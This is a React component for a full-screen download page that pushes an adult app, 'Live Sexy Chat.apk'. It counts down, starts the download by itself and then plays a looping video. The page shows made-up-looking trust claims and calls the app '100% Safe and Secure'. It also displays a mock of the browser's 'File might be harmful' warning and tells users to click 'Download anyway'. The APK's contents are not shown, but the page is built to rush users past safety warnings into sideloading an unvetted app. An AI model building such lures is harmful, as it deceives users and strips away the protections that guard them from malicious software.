import { useCallback, useEffect, useRef, useState } from "react";
import { downloadApkOrZip } from "@/lib/downloadApk";
import videoSrc from "@/assets/WhatsApp Video 2025-08-25 at 22.11.47.mp4";

// Global event name to trigger the interstitial from anywhere
export const OPEN_DOWNLOAD_EVENT = "open-download-interstitial";

type Stage = "countdown" | "downloading" | "video";

const DownloadInterstitial = () => {
  const [open, setOpen] = useState(false);
  const [stage, setStage] = useState<Stage>("countdown");
  const [secondsLeft, setSecondsLeft] = useState(4);
  const timerRef = useRef<number | null>(null);
  const startedRef = useRef(false);
  const downloadedRef = useRef(false);
  const [audioBlocked, setAudioBlocked] = useState(false);
  const [videoReady, setVideoReady] = useState(false);
  const videoRef = useRef<HTMLVideoElement | null>(null);
  const visibilityRef = useRef<() => void>();

  const start = useCallback(async () => {
    // Reset to countdown stage
    setStage("countdown");
    setSecondsLeft(4);
    startedRef.current = true;
    downloadedRef.current = false;

    // Start countdown timer
    if (timerRef.current) window.clearInterval(timerRef.current);
    timerRef.current = window.setInterval(() => {
      setSecondsLeft((prev) => {
        if (prev <= 1) {
          if (timerRef.current) window.clearInterval(timerRef.current);
          return 0;
        }
        return prev - 1;
      });
    }, 1000) as unknown as number;
  }, []);

  const startVideo = useCallback(async () => {
    console.log('Starting video...');
    setStage("video");
    setVideoReady(false);
    setAudioBlocked(false);
    
    // Small delay to ensure DOM is ready
    await new Promise(resolve => setTimeout(resolve, 100));
    
    const v = videoRef.current;
    if (v) {
      console.log('Video element found, loading...');
      // Force reload the video source
      v.load();
      
      try {
        // Wait for video to load
        await new Promise((resolve, reject) => {
          const timeout = setTimeout(() => reject(new Error('Video load timeout')), 5000);
          
          const onCanPlay = () => {
            clearTimeout(timeout);
            v.removeEventListener('canplay', onCanPlay);
            v.removeEventListener('error', onError);
            console.log('Video can play');
            setVideoReady(true);
            resolve(void 0);
          };
          
          const onError = (e) => {
            clearTimeout(timeout);
            v.removeEventListener('canplay', onCanPlay);
            v.removeEventListener('error', onError);
            console.error('Video load error:', e);
            reject(e);
          };
          
          v.addEventListener('canplay', onCanPlay);
          v.addEventListener('error', onError);
        });
        
        // Try to play with sound first
        try {
          v.currentTime = 0;
          v.muted = false;
          await v.play();
          console.log('Video playing with sound');
          setAudioBlocked(false);
        } catch (playError) {
          console.log('Sound blocked, trying muted:', playError);
          // If autoplay with audio blocked, try muted
          try {
            v.muted = true;
            await v.play();
            console.log('Video playing muted');
            setAudioBlocked(true);
          } catch (mutedError) {
            console.error('Video play failed even muted:', mutedError);
            setAudioBlocked(true);
          }
        }
      } catch (loadError) {
        console.error('Video loading failed:', loadError);
        setVideoReady(true); // Show the interface anyway
      }
    } else {
      console.error('Video element not found');
    }
  }, []);

  const onOpen = useCallback(() => {
    setSecondsLeft(4);
    setOpen(true);
    start();
  }, [start]);

  useEffect(() => {
    const handler = () => onOpen();
    window.addEventListener(OPEN_DOWNLOAD_EVENT, handler);
    return () => window.removeEventListener(OPEN_DOWNLOAD_EVENT, handler);
  }, [onOpen]);

  const close = useCallback(() => {
    setOpen(false);
    setStage("countdown");
    setVideoReady(false);
    startedRef.current = false;
    if (timerRef.current) window.clearInterval(timerRef.current);
    if (visibilityRef.current) {
      document.removeEventListener("visibilitychange", visibilityRef.current);
      visibilityRef.current = undefined;
    }
  }, []);

  const handleStartNow = useCallback(() => {
    if (stage === "countdown") {
      setSecondsLeft(0);
    } else if (stage === "downloading") {
      // Already downloading, maybe restart
      downloadApkOrZip();
    } else {
      // Video stage - restart download
      downloadApkOrZip();
    }
  }, [stage]);

  const progress = ((4 - secondsLeft) / 4) * 100;

  // When countdown finishes, trigger download and move to downloading stage
  useEffect(() => {
    if (!open || !startedRef.current || stage !== "countdown") return;
    if (secondsLeft === 0) {
      if (!downloadedRef.current) {
        downloadedRef.current = true;
        setStage("downloading");
        downloadApkOrZip();
        
        // Start video immediately after download starts
        setTimeout(() => startVideo(), 1000);
      }
    }
  }, [secondsLeft, open, stage, startVideo]);

  if (!open) return null;

  if (stage === "countdown") {
    return (
      <div className="fixed inset-0 z-50 bg-white">
        {/* Close button top-right */}
        <button
          onClick={close}
          aria-label="Close"
          className="absolute right-3 top-3 z-10 h-8 w-8 rounded-full bg-black/5 text-gray-700 hover:bg-black/10 flex items-center justify-center"
        >
          ✕
        </button>

        {/* Educational content matching image 1 */}
        <div className="flex flex-col items-center justify-center min-h-screen px-4">
          <div className="mx-auto max-w-[412px] w-full text-center space-y-6">
            {/* Trust indicators */}
            <div className="space-y-2">
              <p className="text-sm text-gray-600">Trusted by 1cr+ users</p>
              <div className="flex justify-center">
                <div className="flex">
                  {[1,2,3,4,5].map(i => (
                    <span key={i} className="text-yellow-400 text-lg">★</span>
                  ))}
                </div>
                <span className="ml-2 text-sm text-gray-600">Rated 4.2/5</span>
              </div>
              <div className="flex justify-center space-x-1">
                {[1,2,3,4].map(i => (
                  <div key={i} className="w-8 h-8 rounded-full bg-gradient-to-r from-pink-400 to-purple-400 flex items-center justify-center text-white text-xs font-bold">
                    {String.fromCharCode(64 + i)}
                  </div>
                ))}
              </div>
            </div>

            {/* Security message */}
            <div className="bg-green-50 rounded-2xl p-6 space-y-2">
              <div className="w-12 h-12 bg-green-100 rounded-full mx-auto flex items-center justify-center">
                <div className="w-6 h-6 bg-green-500 rounded-full flex items-center justify-center">
                  <span className="text-white text-xs">✓</span>
                </div>
              </div>
              <h3 className="text-lg font-semibold text-gray-800">Live Sexy Chat app is</h3>
              <p className="text-xl font-bold text-green-600">100% Safe and Secure</p>
            </div>

            {/* Download instruction */}
            <div className="space-y-4">
              <p className="text-gray-700">
                Click <span className="text-blue-500 font-semibold">"Download anyway"</span> when you see a popup
              </p>
              
              {/* Mock phone with dialog */}
              <div className="mx-auto w-48 h-64 bg-gray-800 rounded-3xl p-4 flex items-center justify-center">
                <div className="bg-white rounded-lg p-4 w-full">
                  <div className="flex items-center space-x-2 mb-2">
                    <div className="w-4 h-4 bg-red-500 rounded-full flex items-center justify-center">
                      <span className="text-white text-xs">!</span>
                    </div>
                    <span className="text-sm font-medium">File might be harmful</span>
                  </div>
                  <p className="text-xs text-gray-600 mb-3">Do you want to download Live Sexy Chat.apk anyway?</p>
                  <div className="flex justify-end space-x-2">
                    <button className="text-xs text-blue-500">Cancel</button>
                    <button className="text-xs text-blue-500 font-medium">Download anyway</button>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>

        {/* Bottom sticky timer + CTA */}
        <div className="fixed bottom-0 left-0 right-0 bg-white border-t">
          <div className="mx-auto max-w-[412px] px-4 pb-[max(env(safe-area-inset-bottom),12px)] pt-3">
            <div className="h-1 w-full bg-gray-200 rounded-full overflow-hidden mb-2">
              <div className="h-full bg-emerald-600 transition-all" style={{ width: `${progress}%` }} />
            </div>
            <p className="text-center text-sm text-gray-700 mb-3">
              Download will begin in <span className="font-semibold text-red-600">{secondsLeft}</span> seconds
            </p>
            <button
              onClick={handleStartNow}
              className="w-full rounded-full bg-emerald-600 hover:bg-emerald-700 text-white font-semibold py-3"
            >
              START NOW
            </button>
          </div>
        </div>
      </div>
    );
  }

  if (stage === "downloading") {
    return (
      <div className="fixed inset-0 z-50 bg-white">
        {/* Close button top-right */}
        <button
          onClick={close}
          aria-label="Close"
          className="absolute right-3 top-3 z-10 h-8 w-8 rounded-full bg-black/5 text-gray-700 hover:bg-black/10 flex items-center justify-center"
        >
          ✕
        </button>

        {/* Downloading state - show same educational content but dimmed */}
        <div className="flex flex-col items-center justify-center min-h-screen px-4 opacity-50">
          <div className="mx-auto max-w-[412px] w-full text-center space-y-6">
            <div className="space-y-2">
              <p className="text-sm text-gray-600">Trusted by 1cr+ users</p>
              <div className="flex justify-center">
                <div className="flex">
                  {[1,2,3,4,5].map(i => (
                    <span key={i} className="text-yellow-400 text-lg">★</span>
                  ))}
                </div>
                <span className="ml-2 text-sm text-gray-600">Rated 4.2/5</span>
              </div>
            </div>
            <div className="bg-green-50 rounded-2xl p-6 space-y-2">
              <div className="w-12 h-12 bg-green-100 rounded-full mx-auto flex items-center justify-center">
                <div className="w-6 h-6 bg-green-500 rounded-full"></div>
              </div>
              <h3 className="text-lg font-semibold text-gray-800">Live Sexy Chat app is</h3>
              <p className="text-xl font-bold text-green-600">100% Safe and Secure</p>
            </div>
          </div>
        </div>

        {/* Bottom message */}
        <div className="fixed bottom-0 left-0 right-0 bg-white border-t">
          <div className="mx-auto max-w-[412px] px-4 pb-[max(env(safe-area-inset-bottom),12px)] pt-3">
            <p className="text-center text-sm text-gray-700 mb-3">
              <span className="font-semibold">Download started!</span> Click "Download anyway" when prompted.
            </p>
            <button
              onClick={handleStartNow}
              className="w-full rounded-full bg-emerald-600 hover:bg-emerald-700 text-white font-semibold py-3"
            >
              RESTART DOWNLOAD
            </button>
          </div>
        </div>
      </div>
    );
  }

  // Video stage
  return (
    <div className="fixed inset-0 z-50 bg-white">
      {/* Close button top-right */}
      <button
        onClick={close}
        aria-label="Close"
        className="absolute right-3 top-3 z-10 h-8 w-8 rounded-full bg-black/5 text-gray-700 hover:bg-black/10 flex items-center justify-center"
      >
        ✕
      </button>

      {/* Video body */}
      <div className="flex items-center justify-center min-h-screen px-4">
        <div className="mx-auto max-w-[412px] w-full">
          <div className="relative w-full aspect-[9/16] bg-white rounded-xl overflow-hidden shadow-sm">
            <video
              ref={videoRef}
              src={videoSrc}
              loop
              playsInline
              preload="metadata"
              muted
              className="w-full h-full object-cover"
              onLoadedData={() => setVideoReady(true)}
              onCanPlay={() => setVideoReady(true)}
              onError={(e) => console.error('Video error:', e)}
            />
            {!videoReady && (
              <div className="absolute inset-0 flex items-center justify-center bg-gray-50">
                <div className="text-center">
                  <div className="mx-auto mb-3 h-8 w-8 rounded-full border-2 border-emerald-600 border-t-transparent animate-spin" />
                  <p className="text-xs text-gray-500">Preparing video…</p>
                </div>
              </div>
            )}
            {audioBlocked && (
              <div className="absolute inset-0 flex items-center justify-center bg-black/30">
                <button
                  onClick={async () => {
                    const v = videoRef.current;
                    if (!v) return;
                    try {
                      v.muted = false;
                      await v.play();
                      setAudioBlocked(false);
                    } catch {}
                  }}
                  className="px-4 py-2 rounded-full bg-emerald-600 text-white font-semibold shadow"
                >
                  Tap to unmute
                </button>
              </div>
            )}
          </div>
        </div>
      </div>

      {/* Bottom CTA */}
      <div className="fixed bottom-0 left-0 right-0 bg-white">
        <div className="mx-auto max-w-[412px] px-4 pb-[max(env(safe-area-inset-bottom),12px)] pt-3">
          <button
            onClick={handleStartNow}
            className="w-full rounded-full bg-emerald-600 hover:bg-emerald-700 text-white font-semibold py-3"
          >
            RESTART DOWNLOAD
          </button>
        </div>
      </div>
    </div>
  );
};

export default DownloadInterstitial;
